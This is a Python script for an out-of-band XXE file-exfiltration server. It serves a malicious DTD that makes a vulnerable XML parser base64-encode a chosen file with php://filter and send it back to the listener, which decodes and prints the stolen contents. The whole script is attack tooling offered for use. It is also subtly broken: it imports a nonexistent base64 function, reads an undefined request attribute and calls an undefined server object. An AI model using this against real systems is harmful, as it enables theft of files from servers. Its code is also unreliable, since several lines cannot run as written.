#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer
from base64 import base64decode

class HTTP_RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        stage,data = (self.data).split('?')
        if stage == '/stage1.xml':
            message = """<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=""" + data + """">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://localhost:9001/stage2.xml?%data;'>">"""

        if stage == '/stage2.xml':
            message = ""
            print(b64decode(data).decode("utf-8"))

        self.send_response(200)
        self.end_headers()
        self.wfile.write(bytes(message, 'utf-8'))
        return

    def log_message(self, format, *args):
        return


def run():
    print('Starting server')
    server_address = ('0.0.0.0',9001)
    httpd = HTTPServer(server_address, HTTP_RequestHandler)
    http.server_forever()

run()
